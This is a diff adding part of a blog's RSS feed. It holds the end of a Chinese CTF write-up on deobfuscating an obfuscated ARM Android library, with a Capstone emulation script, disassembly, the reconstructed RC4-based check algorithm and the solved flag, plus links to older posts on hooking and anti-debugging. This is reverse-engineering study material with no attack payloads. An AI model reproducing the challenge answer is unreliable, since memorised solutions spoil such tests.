+&lt;h3 id=&quot;31-arm处理器模拟&quot;&gt;3.1 ARM处理器模拟&lt;/h3&gt;
+&lt;p&gt;可能有读者马上会问，模拟arm处理器执行不又是一大工程呢。的确，完全模拟确实包含许多工作量。但结合此混淆的一些特性，整个模拟执行可简化许多。&lt;/p&gt;
+
+&lt;p&gt;首先，此混淆并不存在流程分支扁平化(与OLLVM相对比)。结合上述分析也可以看到，所有的混淆执行并不会影响条件标志即CPSR寄存器。&lt;/p&gt;
+
+&lt;p&gt;再者，结合堆栈平衡原理，SP寄存器仅仅只需要保存堆栈的变化，比如stmfd仅仅对SP寄存器进行减法操作。&lt;/p&gt;
+
+&lt;p&gt;最后，根据上述找到的混淆模式，可以发现使用的指令其实很少，实际编写模拟函数工作量也比较小。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;def do_emulate(code, base, Rx):
+	ret_addr = 0xffffffff
+	emu = ARM_emu()
+	md = Cs(CS_ARCH_ARM, CS_MODE_ARM)
+	md.detail = True
+
+	for i in md.disasm(code, base):
+		emu.regs[PC] = i.address + 2 * inst_size
+		dst = i.operands[0]
+		src = i.operands[1]
+
+		if (i.mnemonic).upper() == 'LDR':
+			if dst.type == ARM_OP_REG and src.type == ARM_OP_MEM:
+				Rd = conv_reg(dst.value.reg)	
+				Rs = conv_reg(src.value.mem.base)
+				addr = emu.regs[Rs] + src.value.mem.disp
+				emu.regs[Rd] = Dword(addr &amp;amp; 0xffffffff)
+				
+				if Debug:
+					print ('\t LDR %s :\t0x%x' %(i.op_str, emu.regs[Rd]))
+
+		elif (i.mnemonic).upper() == 'ADD':
+			if i.operands[0].type == ARM_OP_REG and i.operands[1].type == ARM_OP_REG and i.operands[2].type == ARM_OP_REG:
+				Rd = conv_reg(i.operands[0].value.reg)
+				R1 = conv_reg(i.operands[1].value.reg)
+				R2 = conv_reg(i.operands[2].value.reg)
+				emu.regs[Rd] = (emu.regs[R1] + emu.regs[R2]) &amp;amp; 0xffffffff
+				
+				if Debug:
+					print ('\t ADD %s :\t0x%x' %(i.op_str, emu.regs[Rd]))
+		...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;在模拟执行一条真实指令时，首先将所有寄存器的初始值设置为0，通过主流程中的B指令进入到混淆指令。&lt;/p&gt;
+
+&lt;h3 id=&quot;32-真实指令提取&quot;&gt;3.2 真实指令提取&lt;/h3&gt;
+&lt;p&gt;模拟执行时，将混淆中的每条指令都存储到一个指令堆栈中。结合之前直接字符串模式的思路，来实现对真实指令的提取。&lt;/p&gt;
+
+&lt;p&gt;以80A01364为例子来说明真实指令的提取方法。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;seg013:80A01364 sub_80A01364                            ; CODE XREF: sub_80A06620j
+seg013:80A01364                 B               sub_80A0663C
+
+seg013:80A0663C                 BMI             loc_80A06648
+seg013:80A06640                 BPL             loc_80A06644
+seg013:80A06644
+seg013:80A06644 loc_80A06644                            ; CODE XREF: sub_80A0663C+4j
+seg013:80A06644                                         ; sub_80A0663C:loc_80A06648j
+seg013:80A06644                 B               loc_80A06624
+seg013:80A06648 ; 
+seg013:80A06648
+seg013:80A06648 loc_80A06648                            ; CODE XREF: sub_80A0663Cj
+seg013:80A06648                 B               loc_80A06644
+
+seg013:80A06624 loc_80A06624                            ; CODE XREF: 
+seg013:80A06624                 MOV             R1, R2
+seg013:80A06628                 STMFD           SP!, {R0,LR}
+seg013:80A0662C                 MOV             LR, PC
+seg013:80A06630                 BL              loc_80A06634
+seg013:80A06634 ; 
+seg013:80A06634
+seg013:80A06634 loc_80A06634                            ; CODE XREF: sub_80A0663C-Cj
+seg013:80A06634                 LDMFD           SP!, {R0,LR}
+seg013:80A06638                 B               sub_80A0664C
+
+seg013:80A0664C sub_80A0664C                            ; CODE XREF: sub_80A0663C-4p
+seg013:80A0664C                 B               sub_80A01368
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;若不在模拟执行中对指令堆栈修正，那么执行完后存储指令如下所示：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;80A0663C	BMI		loc_80A06648
+80A06648	B		loc_80A06644
+80A06644	B		loc_80A06624
+80A06624	MOV		R1, R2
+80A06628	STMFD	SP!, {R0,LR}
+80A06630	BL		loc_80A06634
+80A06634	LDMFD	SP!, {R0,LR}
+80A06638	B		sub_80A0664C
+80A0664C	B		sub_80A01368
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;对于BMI，虽然形式上和之前分析的(BEQ loc_80A0658C, BNE loc_80A0658C)直接跳到next_jmp，但检测下一条指令即可根据条件相反去处。&lt;/p&gt;
+
+&lt;p&gt;对于STM-LDM，当遇到LDM指令时，将STM-LDM及其之间的指令出栈移除。&lt;/p&gt;
+
+&lt;p&gt;剩余(B B MOV B)这些指令，根据上述人工分析的结果可知，因为只存在一条真实指令，那么MOV必定是真实指令。另外，存在这种情况(B B BNE B)，产生这种情况的根本原因是混淆前这条指令是if或者循环语句的判定点，直接取出BNE指令即可。&lt;/p&gt;
+
+&lt;h3 id=&quot;33-函数识别&quot;&gt;3.3 函数识别&lt;/h3&gt;
+&lt;p&gt;不管是基于指令名称匹配还是解析执行，都需要对函数进行识别。先来看一个函数混淆片段：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;seg013:80A067F0 loc_80A067F0                    ; CODE XREF: seg013:loc_80A06838j
+seg013:80A067F0                 ADR             LR, sub_80A06814
+seg013:80A067F4                 STMFD           SP!, {R8,R9,LR}
+seg013:80A067F8                 LDR             R8, loc_80A067FC
+seg013:80A067FC
+seg013:80A067FC loc_80A067FC                            ; DATA XREF: seg013:80A067F8r
+seg013:80A067FC                 LDR             R9, =0x1A6016A4
+seg013:80A06800                 ADD             R8, R9, R8
+seg013:80A06804                 ADD             R8, PC, R8 ; j_strlen
+seg013:80A06808                 STR             R8, [SP,#8]
+seg013:80A0680C                 LDMFD           SP!, {R8,R9,PC}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;对于未混淆的指令，函数通常被编译为BL或者BLX(指令模式切换)。由于B指令本身的跳转地址范围很有限，那么混淆后代码膨胀必定需要对其指令修正，有点类似InlineHook指令修正。另外，函数的返回地址需要显式存放到LR寄存器。&lt;/p&gt;
+
+&lt;p&gt;这样，上述代码在模拟执行时，当LR寄存器值不为0时，将后续的函数调用转化为’Call sub_xxx’指令，将PC置为next_jmp(sub_80A06814)接着模拟。&lt;/p&gt;
+
+&lt;p&gt;另外，便于更加清晰的分析，将libc.so加载到和进程一致的基地址，通过IDAPython GetFunctionName获取函数名称。&lt;/p&gt;
+
+&lt;p&gt;至此，即可提取出真实指令，check函数流程：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;0x80a0135c            PUSH            {r3, r4, r5, r6, r7, r8, sl, lr}
+0x80a01360            LDR             r3, [r0]
+0x80a01364            MOV             r1, r2
+0x80a01368            MOV             r6, r2
+0x80a0136c            LDR             r3, [r3, #0x2a4]
+0x80a01370            MOV             r2, #0
+0x80a01374            MOV             r4, r0
+0x80a01378            BLX             r3
+0x80a0137c            MOV             r7, r0
+0x80a01380            call	j_strlen
+0x80a01384            ADD             sl, r0, #1
+0x80a01388            MOV             r8, r0
+0x80a0138c            MOV             r0, sl
+0x80a01390            call	j_malloc_0
+0x80a01394            MOV             r1, r7
+0x80a01398            MOV             r2, sl
+0x80a0139c            MOV             r5, r0
+0x80a013a0            call	j_memcpy
+0x80a013a4            LDR             r3, [r4]
+0x80a013a8            MOV             r2, #0
+0x80a013ac            STRB            r2, [r5, r8]
+0x80a013b0            LDR             r3, [r3, #0x2a8]
+0x80a013b4            MOV             r2, r7
+0x80a013b8            MOV             r0, r4
+0x80a013bc            MOV             r1, r6
+0x80a013c0            BLX             r3
+0x80a013c4            LDR             R0, =0x12BC4
+0x80a013c8            MOV             r1, #0x80
+0x80a013cc            LDR             R0, [PC,R0]
+0x80a013d0            call	0x80a01048
+0x80a013d4            ADD             r5, r5, r0
+0x80a013d8            MOV             r0, r5
+0x80a013dc            call	0x80a010c0
+0x80a013e0            MOV             r4, r0
+0x80a013e4            MOV             r0, r5
+0x80a013e8            call	j_free_1
+0x80a013ec            MOV             r0, r4
+0x80a013f0            POP             {r3, r4, r5, r6, r7, r8, sl, pc}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&quot;四算法逆向分析&quot;&gt;四、算法逆向分析&lt;/h2&gt;
+&lt;p&gt;通过简单分析check即可看到算法的核心流程在0x80a010c0这个函数，而0x80a01048函数的功能是对指令路径上的断点进行检测，和其他平台的反调试思路类似，这里把重点放在0x80a010c0的逆向上。自动化分析得到0x80a010c0函数：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;0x80a010c0            PUSH            {r4, r5, r6, r7, r8, sb, sl, lr}
+0x80a010c4            LDR             R7, =0x12EB4
+0x80a010c8            SUB             sp, sp, #0x308
+0x80a010cc            ADD             r6, sp, #4 
+0x80a010d0            LDR             R7, [PC,R7]
+0x80a010d4            LDR             r3, [r7]
+0x80a010d8            MOV             r4, r0
+0x80a010dc            MOV             r1, #0
+0x80a010e0            MOV             r2, #0x100
+0x80a010e4            MOV             r0, r6
+0x80a010e8            ADD             r5, sp, #0x104 
+0x80a010ec            STR             r3, [sp, #0x304]
+0x80a010f0            call	j_memset
+0x80a010f4            MOV             r1, #0
+0x80a010f8            MOV             r2, #0x100
+0x80a010fc            MOV             r0, r5
+0x80a01100            call	j_memset
+0x80a01104            MOV             r0, r4
+0x80a01108            call	j_strlen
+0x80a0110c            SUBS            sb, r0, #0
+0x80a01110            MOVEQ           r0, sb
+0x80a01114            BNE             #0x80a01130
+0x80a01118            LDR             r2, [sp, #0x304]
+0x80a0111c            LDR             r3, [r7]
+0x80a01120            CMP             r2, r3
+0x80a01124            BNE             #0x80a01334
+0x80a01128            ADD             sp, sp, #0x308
+0x80a0112c            POP             {r4, r5, r6, r7, r8, sb, sl, pc}
+
+//获取代码段起始256字节作为key
+0x80a011bc            LDR             R0, =0x12DC0   //读取代码段起始地址
+0x80a011c0            LDR             LR, =0x66666667
+0x80a011c4            MOV             r4, #0
+0x80a011c8            LDR             R0, [PC,R0]
+0x80a011cc            MOV             r3, r0
+0x80a011d0            SMULL           r2, ip, lr, r4
+0x80a011d4            ASR             r2, r4, #0x1f
+0x80a011d8            LDRB            r1, [r3]
+0x80a011dc            RSB             r2, r2, ip, asr #1
+0x80a011e0            ADD             r2, r2, r2, lsl #2
+0x80a011e4            RSB             r2, r2, r4
+0x80a011e8            STRB            r1, [r6, r4]
+0x80a011ec            ADD             r4, r4, #1
+0x80a011f0            CMP             r4, #0x100
+0x80a011f4            ADD             r3, r3, r2
+0x80a011f8            BNE             #0x80a011d0
+
+//key变换流程
+0x80a01218            MOV             r3, #0
+0x80a0121c            MOV             r0, r3
+0x80a01220            ADD             r4, r4, #1
+0x80a01224            ADD             r6, sp, #0x308
+0x80a01228            AND             r4, r4, #0xff
+0x80a0122c            ADD             r1, r6, r4
+0x80a01230            LDRB            r2, [r1, #-0x304] 
+0x80a01234            LDRB            r8, [r5, r3] 
+0x80a01238            AND             ip, r3, #7 
+0x80a0123c            ADD             r0, r2, r0
+0x80a01240            AND             r0, r0, #0xff
+0x80a01244            ADD             r6, r6, r0
+0x80a01248            LDRB            sl, [r6, #-0x304]
+0x80a0124c            ASR             sb, r8, #5
+0x80a01250            ORR             r8, sb, r8, lsl #3 
+0x80a01254            STRB            sl, [r1, #-0x304] 
+0x80a01258            STRB            r2, [r6, #-0x304]
+0x80a0125c            LDRB            r6, [r1, #-0x304]
+0x80a01260            ADD             sl, sp, #0x308
+0x80a01264            RSB             r1, ip, #8 // 8 - [0, 7]
+0x80a01268            ADD             r2, r2, r6
+0x80a0126c            AND             r2, r2, #0xff
+0x80a01270            ADD             r2, sl, r2
+0x80a01274            LDRB            r2, [r2, #-0x304]
+0x80a01278            EOR             r2, r2, r8
+0x80a0127c            AND             r2, r2, #0xff
+0x80a01280            LSL             r1, r2, r1 
+0x80a01284            ORR             ip, r1, r2, asr ip // 循环左移(8 - i)位
+0x80a01288            STRB            ip, [r5, r3] 
+0x80a0128c            ADD             r3, r3, #1
+0x80a01290            CMP             r3, #0x100
+0x80a01294            BNE             #0x80a01220
+
+for(i = 0; i &amp;lt; 0x100; i++){
+	left_rotate(right_rotate(mid_code[i], 5) ^ key_stream[i], 8 - (i % 8));
+...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;限于篇幅，就不在一一分析。其中包括RC4算法。最后得到算法编码主流程：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;char gen_mid_code[N];
+char key_stream[N];
+ 
+for(i = 0; i &amp;lt; N; i++){
+    gen_mid_code[i] = left_rotate(str[gen_index(i, strlen(str))], 8 - (i % 8));
+}
+gen_key_stream(ori_key, key_stream);
+RC4_encrypt(gen_mid_code, key_stream, final_code);
+for(i = 0; i &amp;lt; N; i++){
+	if(final_code[i] != check_code[i]){
+			...
+	}
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;最后，得到flag:Hello Tomorrow!&lt;/p&gt;
+
+&lt;p&gt;至此，此ctf题目大致分析完毕。&lt;/p&gt;
+
+&lt;p&gt;当然，题目有很多有意思的地方，有兴趣的读者可以自行分析。&lt;/p&gt;
+</description>
+        <pubDate>Mon, 21 Dec 2015 21:13:34 +0800</pubDate>
+        <link>http://localhost:4000/2015/12/21/Obfucation-note.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2015/12/21/Obfucation-note.html</guid>
+        
+        
+      </item>
+    
+      <item>
+        <title>早期文章归档</title>
+        <description>&lt;p&gt;&lt;a href=&quot;http://bbs.pediy.com/thread-191649.htm&quot;&gt;简单粗暴的so加解密实现&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://bbs.pediy.com/thread-192047.htm&quot;&gt;无源码加解密实现 &amp;amp;&amp;amp; NDK Native Hook&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://bbs.pediy.com/thread-192874.htm&quot;&gt;ELF section修复的一些思考&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://bbs.pediy.com/thread-193279.htm&quot;&gt;ELF DIY For Anddroid&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://bbs.pediy.com/thread-196228.htm&quot;&gt;SO Hook技术汇总&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://bbs.pediy.com/thread-197512.htm&quot;&gt;SO文件格式及linker机制学习总结(1)&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://bbs.pediy.com/thread-197559.htm&quot;&gt;SO文件格式及linker机制学习总结(2)&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://bbs.pediy.com/thread-199671.htm&quot;&gt;基于HOOK的Anti-debug调用点trace和Anti-anti&lt;/a&gt;&lt;/p&gt;
+</description>
+        <pubDate>Sat, 04 Apr 2015 21:13:34 +0800</pubDate>
+        <link>http://localhost:4000/2015/04/04/archive.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2015/04/04/archive.html</guid>
+        
+        
+      </item>
+    
+  </channel>
+</rss>
